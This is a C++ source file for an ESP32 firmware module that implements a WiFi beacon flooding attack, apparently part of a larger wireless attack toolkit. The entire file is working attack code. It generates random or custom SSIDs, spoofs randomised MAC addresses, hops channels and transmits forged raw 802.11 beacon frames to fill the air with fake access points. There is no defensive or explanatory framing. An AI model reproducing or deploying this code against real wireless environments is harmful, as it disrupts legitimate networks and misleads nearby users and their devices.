/*
 * BeaconFloodAttack.cpp
 * 
 * Implementation of the WiFi Beacon Flooding Attack module
 */

#include "BeaconFloodAttack.h"
#include <WiFi.h>
#include <esp_random.h>

BeaconFloodAttack::BeaconFloodAttack() : Attack(ATTACK_TYPE_BEACON_FLOOD, "Beacon Flood") {
  // Initialize parameters with defaults
  randomSSIDs = true;
  ssidCount = 20;
  ssidPrefix = "WiFi-";
  useRandomMAC = true;
  startChannel = 1;
  endChannel = 11;
  beaconInterval = 100; // ms
  encryptionEnabled = true;
  
  // Initialize state variables
  currentChannel = startChannel;
  currentSSIDIndex = 0;
}

BeaconFloodAttack::~BeaconFloodAttack() {
  // Clean up
  stop();
}

bool BeaconFloodAttack::start(unsigned long duration) {
  // Don't start if already running
  if (status == ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Reset error message
  errorMessage = "";
  
  // Generate SSIDs if using random ones
  if (randomSSIDs) {
    generateRandomSSIDs();
  }
  
  // Check if we have any SSIDs
  if (ssidList.size() == 0) {
    errorMessage = "No SSIDs to broadcast";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Initialize WiFi in station mode
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  
  // Set initial channel
  currentChannel = startChannel;
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  
  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  
  Serial.println("Beacon Flood Attack started");
  Serial.print("Broadcasting ");
  Serial.print(ssidList.size());
  Serial.print(" SSIDs on channels ");
  Serial.print(startChannel);
  Serial.print(" to ");
  Serial.println(endChannel);
  
  // Set start time and duration
  startTime = millis();
  this->duration = duration;
  lastActionTime = 0;
  
  // Update status
  status = ATTACK_STATUS_RUNNING;
  
  return true;
}

bool BeaconFloodAttack::stop() {
  // Only stop if running
  if (status != ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Disable promiscuous mode
  esp_wifi_set_promiscuous(false);
  
  // Restore WiFi
  WiFi.disconnect();
  
  Serial.println("Beacon Flood Attack stopped");
  
  // Update status
  status = ATTACK_STATUS_STOPPING;
  
  return true;
}

void BeaconFloodAttack::update() {
  // Call base class update
  Attack::update();
  
  // Only perform actions if running
  if (status == ATTACK_STATUS_RUNNING) {
    unsigned long currentMillis = millis();
    
    // Send beacons at regular intervals
    if (currentMillis - lastActionTime >= beaconInterval) {
      lastActionTime = currentMillis;
      
      // Send beacon for current SSID
      if (currentSSIDIndex < ssidList.size()) {
        sendBeacon(ssidList[currentSSIDIndex], currentChannel);
        
        // Move to next SSID
        currentSSIDIndex = (currentSSIDIndex + 1) % ssidList.size();
        
        // Change channel if we've gone through all SSIDs
        if (currentSSIDIndex == 0) {
          currentChannel++;
          if (currentChannel > endChannel) {
            currentChannel = startChannel;
          }
          esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        }
      }
    }
  }
}

bool BeaconFloodAttack::setParameter(const String& name, const String& value) {
  if (name == "random") {
    if (value == "true" || value == "1") {
      randomSSIDs = true;
      return true;
    } else if (value == "false" || value == "0") {
      randomSSIDs = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  else if (name == "count") {
    int count = value.toInt();
    if (count > 0 && count <= MAX_BEACON_SSIDS) {
      ssidCount = count;
      return true;
    } else {
      errorMessage = "Invalid count (must be 1-" + String(MAX_BEACON_SSIDS) + ")";
      return false;
    }
  }
  else if (name == "prefix") {
    ssidPrefix = value;
    return true;
  }
  else if (name == "add") {
    // Add a custom SSID to the list
    if (value.length() > 0 && value.length() <= BEACON_SSID_MAX_LENGTH) {
      if (ssidList.size() < MAX_BEACON_SSIDS) {
        ssidList.push_back(value);
        randomSSIDs = false; // Switch to custom SSID list
        return true;
      } else {
        errorMessage = "Maximum number of SSIDs reached";
        return false;
      }
    } else {
      errorMessage = "Invalid SSID length";
      return false;
    }
  }
  else if (name == "clear") {
    ssidList.clear();
    return true;
  }
  else if (name == "randommac") {
    if (value == "true" || value == "1") {
      useRandomMAC = true;
      return true;
    } else if (value == "false" || value == "0") {
      useRandomMAC = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  else if (name == "startchannel") {
    int channel = value.toInt();
    if (channel >= 1 && channel <= 14) {
      startChannel = channel;
      if (startChannel > endChannel) {
        endChannel = startChannel;
      }
      return true;
    } else {
      errorMessage = "Invalid channel (must be 1-14)";
      return false;
    }
  }
  else if (name == "endchannel") {
    int channel = value.toInt();
    if (channel >= 1 && channel <= 14) {
      endChannel = channel;
      if (endChannel < startChannel) {
        startChannel = endChannel;
      }
      return true;
    } else {
      errorMessage = "Invalid channel (must be 1-14)";
      return false;
    }
  }
  else if (name == "interval") {
    int interval = value.toInt();
    if (interval >= 10) {
      beaconInterval = interval;
      return true;
    } else {
      errorMessage = "Invalid interval (must be >= 10ms)";
      return false;
    }
  }
  else if (name == "encryption") {
    if (value == "true" || value == "1") {
      encryptionEnabled = true;
      return true;
    } else if (value == "false" || value == "0") {
      encryptionEnabled = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  
  errorMessage = "Unknown parameter: " + name;
  return false;
}

String BeaconFloodAttack::getParameter(const String& name) const {
  if (name == "random") {
    return randomSSIDs ? "true" : "false";
  }
  else if (name == "count") {
    return String(ssidCount);
  }
  else if (name == "prefix") {
    return ssidPrefix;
  }
  else if (name == "ssids") {
    String result = "";
    for (const String& ssid : ssidList) {
      if (result.length() > 0) {
        result += ", ";
      }
      result += ssid;
    }
    return result;
  }
  else if (name == "randommac") {
    return useRandomMAC ? "true" : "false";
  }
  else if (name == "startchannel") {
    return String(startChannel);
  }
  else if (name == "endchannel") {
    return String(endChannel);
  }
  else if (name == "interval") {
    return String(beaconInterval);
  }
  else if (name == "encryption") {
    return encryptionEnabled ? "true" : "false";
  }
  
  return "";
}

String BeaconFloodAttack::getAllParameters() const {
  String params = "{";
  params += "\"random\":" + String(randomSSIDs ? "true" : "false") + ",";
  params += "\"count\":" + String(ssidCount) + ",";
  params += "\"prefix\":\"" + ssidPrefix + "\",";
  params += "\"ssid_count\":" + String(ssidList.size()) + ",";
  params += "\"randommac\":" + String(useRandomMAC ? "true" : "false") + ",";
  params += "\"startchannel\":" + String(startChannel) + ",";
  params += "\"endchannel\":" + String(endChannel) + ",";
  params += "\"interval\":" + String(beaconInterval) + ",";
  params += "\"encryption\":" + String(encryptionEnabled ? "true" : "false");
  params += "}";
  
  return params;
}

void BeaconFloodAttack::generateRandomSSIDs() {
  // Clear existing SSIDs
  ssidList.clear();
  
  // Generate random SSIDs
  for (int i = 0; i < ssidCount; i++) {
    String ssid = ssidPrefix;
    
    // Add random characters
    int randomLength = random(3, 8);
    for (int j = 0; j < randomLength; j++) {
      char c;
      if (random(3) == 0) {
        // Digit
        c = '0' + random(10);
      } else {
        // Letter
        c = 'A' + random(26);
      }
      ssid += c;
    }
    
    ssidList.push_back(ssid);
  }
}

void BeaconFloodAttack::sendBeacon(const String& ssid, uint8_t channel) {
  // Create a copy of the beacon packet template
  uint8_t packet[BEACON_PACKET_SIZE];
  memcpy(packet, beaconPacket, BEACON_PACKET_SIZE);
  
  // Set MAC address (source and BSSID)
  uint8_t mac[6];
  if (useRandomMAC) {
    generateRandomMAC(mac);
  } else {
    // Use ESP32's MAC address
    esp_read_mac(mac, ESP_MAC_WIFI_STA);
  }
  
  memcpy(&packet[10], mac, 6); // Source MAC
  memcpy(&packet[16], mac, 6); // BSSID
  
  // Set channel
  packet[82] = channel;
  
  // Set SSID
  int ssidLength = ssid.length();
  if (ssidLength > BEACON_SSID_MAX_LENGTH) {
    ssidLength = BEACON_SSID_MAX_LENGTH;
  }
  
  packet[37] = ssidLength; // SSID length
  memcpy(&packet[38], ssid.c_str(), ssidLength);
  
  // Calculate packet length
  int packetLength = 38 + ssidLength + 12; // Header + fixed params + SSID + rates + channel
  
  // Add encryption if enabled
  if (encryptionEnabled) {
    // RSN (WPA2) information element is already in the template
    packetLength += 22; // RSN element length
  } else {
    // Remove RSN element by not including it in the packet length
  }
  
  // Send the packet
  esp_wifi_80211_tx(WIFI_IF_STA, packet, packetLength, false);
  
  // Debug output
  if (currentSSIDIndex == 0) { // Only print for the first SSID to avoid flooding the console
    Serial.print("Sent beacon for SSID '");
    Serial.print(ssid);
    Serial.print("' on channel ");
    Serial.print(channel);
    Serial.print(" with MAC ");
    printMACAddress(mac);
  }
}

void BeaconFloodAttack::generateRandomMAC(uint8_t* mac) {
  // Generate random MAC address
  for (int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  
  // Ensure it's a unicast address (clear bit 0 of the first byte)
  mac[0] &= 0xFE;
  
  // Ensure it's a locally administered address (set bit 1 of the first byte)
  mac[0] |= 0x02;
}

void BeaconFloodAttack::printMACAddress(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.println(macStr);
}
